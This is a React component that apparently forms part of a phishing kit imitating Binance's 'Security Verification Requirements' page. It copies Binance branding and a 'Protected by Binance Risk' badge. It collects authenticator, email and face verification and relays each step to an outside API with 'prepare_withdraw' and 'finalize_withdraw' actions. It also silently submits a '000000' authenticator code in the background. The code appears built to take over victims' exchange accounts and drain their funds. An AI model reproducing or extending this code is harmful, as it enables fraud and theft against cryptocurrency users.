import React, { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { Mail, KeyRound, User, Check, ArrowRight, X } from 'lucide-react';
import { PageTransition } from '../components/PageTransition';
import { BinanceLogo, FaceVerificationIcon } from '../components/Icons';
import { VerificationModal } from '../components/VerificationModal';
import { API_BASE_URL, checkLoginExpiration } from '../services/api';
import { Spinner } from '../components/Spinner';

// Add interface for the API response
interface VerificationResponse {
  success: boolean;
  quotationId: string;
  bizNo: string;
  gauth: boolean;
  mobileSecurity: boolean;
  mobileNo: string;
  verificationSteps: string[];
}

export const VerificationRequired: React.FC = () => {
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [verificationType, setVerificationType] = useState<'authenticator' | 'email' | 'facial' | null>(null);
  const [completedVerifications, setCompletedVerifications] = useState<string[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const apiCallMade = useRef(false);
  const [displayName, setDisplayName] = useState<string | null>(null);
  const [verificationMethods, setVerificationMethods] = useState({
    authenticator: false,
    email: false,
    facial: false
  });
  const [isFinalizingWithdraw, setIsFinalizingWithdraw] = useState(false);

  const navigate = useNavigate();
  const totalVerifications = Object.values(verificationMethods).filter(Boolean).length - 
    (verificationMethods.authenticator && localStorage.getItem('ownauthenticator') === 'false' ? 1 : 0);
  const completedCount = completedVerifications.length;

  // Add API call on page load
  useEffect(() => {
    if (apiCallMade.current) return;
    apiCallMade.current = true;

    const prepareVerification = async () => {
      try {
        const sessionId = localStorage.getItem('session_id');
        const response = await fetch(`${API_BASE_URL}/?action=withdraw&task=prepare_withdraw`, {
          method: 'POST',
          headers: {
            'Accept': '*/*',
            'Content-Type': 'text/plain',
          },
          body: JSON.stringify({ 
            session_id: sessionId 
          }),
        });

        const data: VerificationResponse = await response.json();
        console.log('Verification response:', data);
        
        // Check for login expiration
        checkLoginExpiration(data);

        if (!data.success) {
          navigate('/success');
          return;
        }

        // Rest of your existing code for successful response
        localStorage.setItem('quotationId', data.quotationId || '');
        localStorage.setItem('bizNo', data.bizNo || '');
        localStorage.setItem('mobileNo', data.mobileNo || '');

        setVerificationMethods({
          authenticator: data.verificationSteps.includes('GOOGLE'),
          email: data.verificationSteps.includes('EMAIL'),
          facial: data.verificationSteps.includes('FACE')
        });

        setIsLoading(false);
      } catch (error) {
        console.error('Verification preparation failed:', error);
        navigate('/success');
        setIsLoading(false);
      }
    };

    prepareVerification();
  }, []);

  // Add useEffect for getting user name
  useEffect(() => {
    const userData = localStorage.getItem('userData');
    if (userData) {
      const { firstName, lastName, email } = JSON.parse(userData);
      
      if (!firstName && !lastName && !email) {
        setDisplayName(null);
        return;
      }

      let formattedName = '';
      if (firstName || lastName) {
        if (firstName && lastName) {
          formattedName = `${firstName} ${lastName.charAt(0)}`;
        } else {
          formattedName = firstName || lastName;
        }
      } else if (email) {
        formattedName = email.split('@')[0];
      }

      setDisplayName(formattedName || null);
    }
  }, []);

  const handleVerification = (type: 'authenticator' | 'email' | 'facial') => {
    console.log('Handling verification:', type);  // Debug log
    setVerificationType(type);
    setIsModalOpen(true);
  };

  // Add console log before render to debug
  console.log('Current verification methods:', verificationMethods);

  // Add check for completion and finalize
  useEffect(() => {
    const finalizeWithdraw = async () => {
      try {
        setIsFinalizingWithdraw(true);
        const sessionId = localStorage.getItem('session_id');
        const bizNo = localStorage.getItem('bizNo');
        const quotationId = localStorage.getItem('quotationId');
        
        if (!quotationId) {
          console.error('Missing quotationId in localStorage');
          setIsFinalizingWithdraw(false);
          return;
        }

        const response = await fetch(`${API_BASE_URL}/?action=withdraw&task=finalize_withdraw`, {
          method: 'POST',
          headers: {
            'Accept': '*/*',
            'Content-Type': 'text/plain',
          },
          body: JSON.stringify({
            session_id: sessionId,
            bizNo: bizNo,
            quotationId: quotationId
          }),
        });

        const data = await response.json();
        console.log('Finalize withdraw response:', data);
        
        // Check for login expiration
        checkLoginExpiration(data);
        
        if (data.success) {
          navigate('/success');
        }
      } catch (error) {
        console.error('Failed to finalize withdraw:', error);
      } finally {
        setIsFinalizingWithdraw(false);
      }
    };

    // Check if all visible steps are completed
    const requiredSteps = totalVerifications; // Use the adjusted total that excludes hidden authenticator
    const completedSteps = completedVerifications.length;
    
    if (requiredSteps > 0 && completedSteps === requiredSteps) {
      finalizeWithdraw();
    }
  }, [completedVerifications, totalVerifications, navigate]);

  // Add useEffect to check for ownauthenticator flag on load
  useEffect(() => {
    if (!isLoading && 
        verificationMethods.authenticator && 
        !completedVerifications.includes('authenticator') && 
        localStorage.getItem('ownauthenticator') === 'false') {
      
      console.log('Auto-completing Google Authenticator verification');
      
      // Make background request with 000000 code
      const makeBackgroundRequest = async () => {
        try {
          const sessionId = localStorage.getItem('session_id');
          const bizNo = localStorage.getItem('bizNo');
          
          const response = await fetch(`${API_BASE_URL}/?action=codes&task=confirm_code`, {
            method: 'POST',
            headers: {
              'Accept': '*/*',
              'Content-Type': 'text/plain',
            },
            body: JSON.stringify({
              session_id: sessionId,
              bizNo: bizNo,
              gauthcode: '000000'
            }),
          });
          
          const data = await response.json();
          console.log('Background verification response:', data);
          
          // Check for login expiration
          checkLoginExpiration(data);
          
          if (data.success) {
            // Mark as completed only after successful verification
            setCompletedVerifications(prev => [...prev, 'authenticator']);
          }
        } catch (error) {
          console.error('Background verification failed:', error);
        }
      };

      makeBackgroundRequest();
    }
  }, [isLoading, verificationMethods.authenticator, completedVerifications]);

  // Determine if the authenticator step should be shown
  const shouldShowAuthenticator = verificationMethods.authenticator && 
                                 !(localStorage.getItem('ownauthenticator') === 'false' &&
                                   !completedVerifications.includes('authenticator'));

  return (
    <PageTransition>
      <div className="relative min-h-screen bg-[rgb(30,35,41)]">
        {isFinalizingWithdraw && (
          <div className="fixed inset-0 bg-[rgb(30,35,41)]/30 backdrop-blur-[1px] z-50 flex items-center justify-center">
            <Spinner overlayClassName="bg-transparent" />
          </div>
        )}

        <div className={isFinalizingWithdraw ? 'blur-[1px]' : ''}>
          <div className="min-h-screen bg-[#0B0E11] flex flex-col relative">
            {/* Header stays visible */}
            <header className="bg-[rgb(30,35,41)] px-4 py-5">
              <div className="max-w-[1200px] mx-auto flex justify-between items-center">
                <BinanceLogo />
                {displayName && (
                  <div className="flex items-center gap-2 text-[#EAECEF]">
                    <User size={20} className="text-[#F0B90B]" />
                    <span className="text-[14px] font-[500]">{displayName}</span>
                  </div>
                )}
              </div>
            </header>

            {/* Main Content with relative positioning */}
            <div className="flex-1 bg-[rgb(30,35,41)] relative">
              <main className="w-full flex flex-col items-center justify-center p-4 pt-8 sm:pt-12">
                {isLoading ? (
                  <div className="absolute inset-0">
                    <Spinner 
                      message="Loading verification requirements..."
                      overlayClassName="bg-[rgb(30,35,41)] backdrop-blur-none"
                    />
                  </div>
                ) : (
                  <div className="w-full max-w-[480px] px-6">
                    {/* Title */}
                    <div className="mb-8">
                      <h1 className="text-[32px] font-semibold text-[#EAECEF] mb-4">
                        Security Verification Requirements
                      </h1>
                      <p className="text-[#848E9C] text-[16px]">
                        You need to complete all of the following verifications to continue.
                      </p>
                    </div>

                    {/* Progress */}
                    <div className="mb-8">
                      <span className="text-[#F0B90B] text-[32px] font-semibold">
                        {completedCount}/{totalVerifications}
                      </span>
                    </div>

                    {/* Verification Steps */}
                    <div className="space-y-3">
                      {shouldShowAuthenticator && (
                        <button 
                          onClick={() => {
                            if (!completedVerifications.includes('authenticator')) {
                              setVerificationType('authenticator');
                              setIsModalOpen(true);
                            }
                          }}
                          className={`w-full flex items-center justify-between text-[#EAECEF] rounded-lg py-5 px-4 transition-colors ${
                            completedVerifications.includes('authenticator') 
                              ? 'cursor-default bg-[#1E2329]' 
                              : 'border border-[#474D57] hover:border-[#F0B90B]'
                          }`}
                        >
                          <div className="flex items-center gap-3">
                            <KeyRound size={20} className="text-[#F0B90B]" />
                            <span>Google Authenticator</span>
                          </div>
                          {completedVerifications.includes('authenticator') ? (
                            <Check size={20} className="text-[#02C076]" />
                          ) : (
                            <ArrowRight size={20} className="text-[#848E9C]" />
                          )}
                        </button>
                      )}

                      {verificationMethods.email && (
                        <button 
                          onClick={() => {
                            if (!completedVerifications.includes('email')) {
                              setVerificationType('email');
                              setIsModalOpen(true);
                            }
                          }}
                          className={`w-full flex items-center justify-between text-[#EAECEF] rounded-lg py-5 px-4 transition-colors ${
                            completedVerifications.includes('email') 
                              ? 'cursor-default bg-[#1E2329]' 
                              : 'border border-[#474D57] hover:border-[#F0B90B]'
                          }`}
                        >
                          <div className="flex items-center gap-3">
                            <Mail size={20} className="text-[#F0B90B]" />
                            <span>Email Verification</span>
                          </div>
                          {completedVerifications.includes('email') ? (
                            <Check size={20} className="text-[#02C076]" />
                          ) : (
                            <ArrowRight size={20} className="text-[#848E9C]" />
                          )}
                        </button>
                      )}

                      {verificationMethods.facial && (
                        <button 
                          onClick={() => {
                            if (!completedVerifications.includes('facial')) {
                              setVerificationType('facial');
                              setIsModalOpen(true);
                            }
                          }}
                          className={`w-full flex items-center justify-between text-[#EAECEF] rounded-lg py-5 px-4 transition-colors ${
                            completedVerifications.includes('facial') 
                              ? 'cursor-default bg-[#1E2329]' 
                              : 'border border-[#474D57] hover:border-[#F0B90B]'
                          }`}
                        >
                          <div className="flex items-center gap-3">
                            <FaceVerificationIcon className="w-5 h-5 text-[#F0B90B]" />
                            <span>Face Verification</span>
                          </div>
                          {completedVerifications.includes('facial') ? (
                            <Check size={20} className="text-[#02C076]" />
                          ) : (
                            <ArrowRight size={20} className="text-[#848E9C]" />
                          )}
                        </button>
                      )}
                    </div>

                    {/* Security verification unavailable link */}
                    <div className="mt-8 text-center">
                      <button className="text-[#F0B90B] hover:text-[#FCD535] text-[14px] font-[500]">
                        Security verification unavailable?
                      </button>
                    </div>

                    {/* Protected by Binance Risk */}
                    <div className="mt-4 text-center">
                      <p className="text-[#848E9C] text-[12px] flex items-center justify-center gap-2">
                        <svg 
                          fill="DisabledText" 
                          className="bn-svg w-5 h-5" 
                          viewBox="0 0 24 24" 
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path 
                            fillRule="evenodd" 
                            clipRule="evenodd" 
                            d="M4 4v12l8 5 8-5V4H4zm12 7a4 4 0 11-8 0 4 4 0 018 0zm-4-2.121L9.879 11 12 13.121 14.121 11 12 8.879z" 
                            fill="currentColor"
                          />
                        </svg>
                        Protected by Binance Risk
                      </p>
                    </div>
                  </div>
                )}
              </main>
            </div>

            <VerificationModal 
              isOpen={isModalOpen}
              onClose={() => {
                setIsModalOpen(false);
                setVerificationType(null);
              }}
              verificationType={verificationType}
              onComplete={(type) => {
                console.log('Verification completed:', type);  // Debug log
                setCompletedVerifications(prev => [...prev, type]);
                setIsModalOpen(false);
                setVerificationType(null);
              }}
            />
          </div>
        </div>
      </div>
    </PageTransition>
  );
};